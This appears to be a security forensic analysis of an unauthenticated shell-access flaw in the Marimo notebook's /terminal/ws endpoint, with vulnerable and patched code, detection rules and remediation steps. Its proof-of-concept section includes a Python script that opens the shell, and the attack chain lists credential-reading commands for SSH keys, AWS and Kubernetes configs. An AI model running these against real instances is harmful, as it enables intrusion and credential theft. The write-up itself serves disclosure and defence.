# Marimo Python Notebook — Pre-Auth RCE Forensic Analysis

**CVE:** `CVE-2026-39987` / `GHSA-2679-6mx9-h9xc`  
**CVSS Score:** 9.3 (Critical)  
**Analysis Date:** 2026-04-10  
**Affected Versions:** All versions ≤ 0.20.4  
**Fixed Version:** 0.23.0  
**Original Research Credit:** [Sysdig TRT](https://sysdig.com/blog/marimo-oss-python-notebook-rce-from-disclosure-to-exploitation-in-under-10-hours)  
**Advisory:** [GHSA-2679-6mx9-h9xc](https://github.com/advisories/GHSA-2679-6mx9-h9xc)

---

## 1. Executive Summary

A **pre-authentication remote code execution vulnerability** exists in Marimo, an open-source reactive Python notebook platform. The flaw resides in the `/terminal/ws` WebSocket endpoint, which completely bypasses authentication validation — allowing an unauthenticated attacker to obtain a full interactive PTY shell and execute arbitrary system commands on any exposed Marimo instance via a single WebSocket connection.

Disclosed on **April 8, 2026**, the vulnerability was exploited in the wild within **9 hours and 41 minutes**. No public proof-of-concept existed at the time of first exploitation. A complete credential theft operation was observed within **3 minutes** of initial access.

| Property | Value |
|---|---|
| **Verdict** | Critical — Pre-Auth RCE via Authentication Bypass |
| **Classification** | WebSocket Authentication Bypass / Unauthenticated RCE |
| **CVE** | CVE-2026-39987 |
| **CVSS Score** | 9.3 (Critical) |
| **Time to First Exploit** | 9 hours 41 minutes post-disclosure |
| **PoC Available at Exploit Time** | No — attacker built exploit from advisory text alone |
| **Patch Available** | Yes — upgrade to v0.23.0 |

---

## 2. Vulnerability Details

### 2.1 Overview

Marimo's server exposes multiple WebSocket endpoints to support interactive notebook functionality. All other endpoints correctly call `validate_auth()` before accepting connections. The `/terminal/ws` endpoint — which provides full PTY (pseudo-terminal) shell access — was the sole exception, performing no authentication check whatsoever.

The root cause is a **missing `validate_auth()` call** in the terminal WebSocket handler.

### 2.2 Vulnerable Code Path

**File:** `marimo/_server/api/endpoints/terminal.py` (lines 340–356)

```python
# VULNERABLE — versions <= 0.20.4
@router.websocket("/terminal/ws")
async def websocket_endpoint(websocket: WebSocket) -> None:
    app_state = AppState(websocket)

    # Only checks mode and platform — NO authentication
    if app_state.mode != SessionMode.EDIT:
        await websocket.close(code=1008, reason="Terminal only available in edit mode")
        return

    if not PTY_SUPPORTED:
        await websocket.close(code=1008, reason="PTY not supported on this platform")
        return

    await websocket.accept()   # ← attacker is now in with a full shell
```

**File:** `marimo/_server/api/endpoints/ws_endpoint.py` (lines 67–82)

```python
# SECURE — how other endpoints handle it
@router.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket) -> None:
    validator = WebSocketConnectionValidator()
    await validator.validate_auth(websocket)   # ← this line was missing from /terminal/ws
    await websocket.accept()
```

### 2.3 Authentication Mechanism Context

Marimo uses Starlette's `AuthenticationMiddleware`, which marks unauthenticated users as `UnauthenticatedUser` but does **not** actively reject WebSocket connections. Enforcement depends entirely on `@requires()` decorators or explicit `validate_auth()` calls — neither of which were present on `/terminal/ws`.

The result: the authentication system functioned correctly everywhere else, making this a localised oversight rather than a systemic design failure.

### 2.4 Fixed Code (v0.23.0)

```python
# PATCHED — version 0.23.0+
@router.websocket("/terminal/ws")
async def websocket_endpoint(websocket: WebSocket) -> None:
    app_state = AppState(websocket)

    await validate_auth(websocket)   # ← patch: added authentication check

    if app_state.mode != SessionMode.EDIT:
        await websocket.close(code=1008, reason="Terminal only available in edit mode")
        return

    await websocket.accept()
```

---

## 3. Attack Chain

```
Attacker identifies exposed Marimo instance
              │
              ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 1: Endpoint Discovery                            │
│  curl -s -o /dev/null -w "%{http_code}"                 │
│       http://TARGET:2718/terminal/ws                    │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 2: Unauthenticated WebSocket Connection          │
│  websocat ws://TARGET:2718/terminal/ws                  │
│  → Full PTY shell granted with NO credentials           │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 3: System Enumeration & Credential Theft         │
│  - id, whoami, uname -a                                 │
│  - cat ~/.ssh/id_rsa                                    │
│  - env | grep -i key                                    │
│  - cat ~/.aws/credentials                               │
│  - find / -name "*.pem" 2>/dev/null                     │
│  [Completed in under 3 minutes in observed attack]      │
└──────────────────────────┬──────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────┐
│  STAGE 4: Post-Exploitation                             │
│  - Exfiltrate secrets, tokens, API keys                 │
│  - Establish persistence                                │
│  - Pivot to connected cloud/K8s environments            │
└─────────────────────────────────────────────────────────┘
```

---

## 4. Proof of Concept (Verification Only)

> ⚠️ **For defensive verification and detection engineering purposes only.**  
> Only test against systems you own or have explicit written permission to test.

### 4.1 Check if Endpoint is Exposed

```bash
curl -s -o /dev/null -w "%{http_code}" http://TARGET:2718/terminal/ws
```

### 4.2 WebSocket Connection Test

```bash
websocat ws://TARGET:2718/terminal/ws -v
```

### 4.3 Python Verification Script

```python
import websocket
import time

ws = websocket.WebSocket()
ws.connect('ws://TARGET:2718/terminal/ws')
time.sleep(2)

# Drain initial output
try:
    while True:
        ws.settimeout(1)
        ws.recv()
except:
    pass

# Verify RCE
ws.send('id\n')
time.sleep(2)
print(ws.recv())
# Expected output on vulnerable host:
# uid=0(root) gid=0(root) groups=0(root)

ws.close()
```

---

## 5. Exploitation Timeline

| Time | Event |
|---|---|
| **2026-04-08 ~09:00 UTC** | Marimo security advisory (GHSA-2679-6mx9-h9xc) published |
| **2026-04-08 ~09:00 UTC** | v0.23.0 patch released simultaneously |
| **2026-04-08 ~18:41 UTC** | First exploitation attempt observed in the wild by Sysdig TRT |
| **2026-04-08 ~18:44 UTC** | Full credential theft operation completed (< 3 minutes) |
| **2026-04-10** | This analysis |

**Time from disclosure to exploitation: 9 hours 41 minutes**

No public PoC existed on GitHub or any exploit repository at the time of first attack. The attacker built a working exploit directly from the advisory description — specifically the endpoint path (`/terminal/ws`) and the explicit statement that it lacked authentication.

### Exploitation Speed Benchmarks (2026)

| Vulnerability | Time to First Exploit | PoC Available |
|---|---|---|
| Marimo CVE-2026-39987 | **9h 41m** | No |
| Langflow CVE-2026-33017 | 20 hours | No |
| BeyondTrust CVE-2026-1731 | Days | No |

Marimo set a new benchmark — cutting Langflow's exploitation window by more than half.

---

## 6. System Fingerprinting Observed in Attack

Based on Sysdig TRT's observed exploitation, the attacker ran the following commands post-connection:

| Command | Purpose |
|---|---|
| `id` | Confirm privilege level |
| `whoami` | User context |
| `uname -a` | OS and kernel version |
| `cat ~/.ssh/id_rsa` | SSH private key theft |
| `env` | Environment variable harvesting (API keys, tokens) |
| `cat ~/.aws/credentials` | AWS credential theft |
| `find / -name "*.pem"` | Certificate/key enumeration |
| `cat ~/.kube/config` | Kubernetes config theft |

---

## 7. Affected Environments

Instances are vulnerable if **all** of the following are true:

| Condition | Risk |
|---|---|
| Running Marimo ≤ v0.20.4 in **edit mode** | ✅ Vulnerable |
| Exposed to the network via `--host 0.0.0.0` | ✅ Vulnerable |
| No external authentication proxy in front of Marimo | ✅ Vulnerable |

You are **not** affected if any of these apply:

- Running Marimo in **run/application mode** (not edit mode)
- Instance is bound to `127.0.0.1` / `localhost` only
- An authenticated reverse proxy sits in front of Marimo
- Already upgraded to v0.23.0 or later

---

## 8. MITRE ATT&CK Mapping

| ID | Technique | Notes |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Unauthenticated WebSocket endpoint |
| T1059.006 | Python Execution | Full PTY shell via Python notebook server |
| T1078 | Valid Accounts | No credentials required — auth fully bypassed |
| T1552.001 | Credentials in Files | SSH keys, `.aws/credentials`, `.kube/config` |
| T1552.007 | Container API | Kubernetes token harvesting |
| T1005 | Data from Local System | Credential and secret exfiltration |
| T1082 | System Information Discovery | OS fingerprinting, user context |
| T1083 | File and Directory Discovery | `find / -name "*.pem"` |
| T1530 | Data from Cloud Storage | AWS/GCP/Azure credential theft |
| T1021.004 | Remote Services: SSH | Stolen SSH keys enable lateral movement |

---

## 9. Detection Recommendations

### 9.1 Network Detection

```
# Alert on unauthenticated WebSocket connections to /terminal/ws
alert websocket dst_port 2718 uri "/terminal/ws" without auth header

# Alert on Marimo default port exposure to non-localhost
alert TCP src !127.0.0.1 dst_port 2718

# Hunt for connections from unexpected source IPs to Marimo instances
alert TCP external_net any -> $MARIMO_HOSTS 2718
```

### 9.2 Endpoint Detection

```bash
# Check if Marimo is running in edit mode exposed to network
ps aux | grep "marimo edit" | grep "0.0.0.0"

# Check Marimo version
pip show marimo | grep Version

# Check for active terminal WebSocket connections
ss -tnp | grep 2718
netstat -anp | grep 2718
```

### 9.3 Log-Based Detection (SIEM)

```
# Marimo server log patterns indicating exploitation
- WebSocket connection to /terminal/ws without authentication token
- POST /terminal/ws from external IP ranges
- Rapid command execution via WebSocket (< 5s between connections)

# KQL (Microsoft Sentinel)
DeviceNetworkEvents
| where RemotePort == 2718
| where InitiatingProcessFileName !in ("marimo", "python", "python3")
| where RemoteIPType == "Public"
```

### 9.4 YARA / Sigma Indicators

```yaml
# Sigma Rule — Marimo Terminal WebSocket Exploitation Attempt
title: Marimo Pre-Auth RCE Exploitation Attempt
status: experimental
logsource:
  category: webserver
detection:
  selection:
    cs-uri-stem|contains: '/terminal/ws'
    cs-method: 'GET'
  filter:
    c-ip|startswith:
      - '127.'
      - '10.'
      - '192.168.'
  condition: selection and not filter
falsepositives:
  - Legitimate internal developer access
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cve.2026-39987
```

---

## 10. Remediation

### 10.1 Immediate Actions (Priority Order)

```bash
# 1. Upgrade Marimo immediately
pip install --upgrade marimo
# or
uv pip install --upgrade marimo

# 2. Verify patched version
pip show marimo | grep Version
# Expected: Version: 0.23.0 or higher

# 3. If immediate patching is not possible — restrict to localhost only
# Change launch command from:
marimo edit --host 0.0.0.0 notebook.py
# To:
marimo edit --host 127.0.0.1 notebook.py
# Use SSH tunnelling for remote access instead
```

### 10.2 If You Were Running ≤ v0.20.4 Exposed to the Network

Assume compromise. Take the following steps:

```bash
# Rotate ALL secrets accessible from the Marimo server environment
# 1. SSH keys
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_new
# Revoke old keys from all authorized_keys files and remote services

# 2. AWS credentials
aws iam create-access-key --user-name <username>
aws iam delete-access-key --access-key-id <old-key-id>

# 3. Kubernetes
kubectl create serviceaccount new-sa -n <namespace>
# Revoke old service account tokens

# 4. Environment variables / secrets
# Audit all .env files, CI/CD secrets, and vault entries on the host
# Rotate anything that was readable from the marimo server process
```

### 10.3 Hardening Recommendations

| Control | Implementation |
|---|---|
| Bind to localhost only | `--host 127.0.0.1` |
| Use SSH tunnelling for remote access | `ssh -L 2718:localhost:2718 user@host` |
| Place authenticated reverse proxy in front | nginx/Caddy with auth middleware |
| Network segmentation | Restrict port 2718 to trusted IP ranges only |
| Monitor WebSocket connections | Alert on /terminal/ws from unexpected sources |
| Keep Marimo updated | Use `uv pip install --upgrade marimo` regularly |

---

## 11. Infrastructure & Exposure Analysis

### 11.1 Shodan Query

```
http.title:"marimo" port:2718
```

At time of disclosure, a non-trivial number of Marimo instances were publicly accessible with default configuration — many running in edit mode, directly exposed to the internet.

### 11.2 Exposure Risk Factors

| Factor | Detail |
|---|---|
| Default port | 2718 — easily discoverable via Shodan/Censys |
| Default host binding | `0.0.0.0` in many deployment guides |
| Data science environments | Often run in cloud VMs (AWS EC2, GCP, Azure) with permissive security groups |
| CI/CD integrations | Marimo used in some automated pipeline contexts |
| Kubernetes deployments | Some users expose Marimo via NodePort/LoadBalancer services |

---

## 12. Broader Context — Exploitation Speed Trend

This vulnerability highlights an accelerating trend in the threat landscape: **attackers are monitoring advisory feeds in real time and weaponising vulnerabilities within hours of disclosure** — without waiting for public PoC code.

Sysdig TRT assess this acceleration is likely driven by **AI-assisted exploit development**, where advisory text is fed directly into LLM-based tooling to auto-generate working exploit code.

The implications for defenders are significant:

- **Patch windows are now measured in hours, not days**
- Advisory publication is itself a trigger for exploitation — even for niche, low-profile software
- Runtime detection and network segmentation are now critical compensating controls for the period between disclosure and patch deployment
- Marimo has ~20,000 GitHub stars — a fraction of Langflow (145,000+). Target size no longer correlates with exploitation speed.

---

## 13. Timeline

| Date | Event |
|---|---|
| **Pre-2026** | Marimo terminal WebSocket endpoint shipped without authentication |
| **2026-04-08** | CVE-2026-39987 / GHSA-2679-6mx9-h9xc disclosed by Marimo maintainers |
| **2026-04-08** | Patch released simultaneously (v0.23.0) |
| **2026-04-08 +9h 41m** | First exploitation in the wild observed by Sysdig TRT |
| **2026-04-08 +9h 44m** | Full credential theft operation completed |
| **2026-04-10** | This analysis published |

---

## 14. Related Vulnerabilities (2026 Exploitation Speed Comparison)

| CVE | Product | Exploit Window | Notes |
|---|---|---|---|
| CVE-2026-39987 | Marimo | **9h 41m** | No PoC — advisory text only |
| CVE-2026-33017 | Langflow | 20 hours | No PoC |
| CVE-2026-22719 | VMware Aria Ops | Days | CISA KEV |
| CVE-2026-1731 | BeyondTrust | Days | Active ransomware campaigns |

---

## 15. IOCs & Detection Artefacts

### Network

| Indicator | Type | Notes |
|---|---|---|
| `TARGET:2718/terminal/ws` | URL Pattern | Vulnerable endpoint |
| Port `2718` | Network | Marimo default port |

### Process

| Indicator | Type | Notes |
|---|---|---|
| `marimo edit --host 0.0.0.0` | Process cmdline | Exposed edit mode |
| WebSocket to `/terminal/ws` without auth | Network behaviour | Exploitation indicator |

### File System (Post-Exploitation)

| Path | OS | Notes |
|---|---|---|
| `~/.ssh/id_rsa` | Linux/macOS | SSH private key target |
| `~/.aws/credentials` | Linux/macOS/Windows | AWS credential target |
| `~/.kube/config` | Linux/macOS/Windows | Kubernetes config target |
| `/tmp/` | Linux | Common attacker staging area |

---

## 16. References

| Source | URL |
|---|---|
| Sysdig TRT Analysis | https://sysdig.com/blog/marimo-oss-python-notebook-rce-from-disclosure-to-exploitation-in-under-10-hours |
| GitHub Advisory | https://github.com/advisories/GHSA-2679-6mx9-h9xc |
| GitLab Advisory DB | https://advisories.gitlab.com/pkg/pypi/marimo/GHSA-2679-6mx9-h9xc/ |
| Marimo Releases | https://github.com/marimo-team/marimo/releases |
| Marimo Security Docs | https://docs.marimo.io/security/ |
| The Hacker News | https://thehackernews.com/2026/04/marimo-rce-flaw-cve-2026-39987.html |
| DailyCVE | https://dailycve.com/marimo-pre-auth-rce-critical/ |
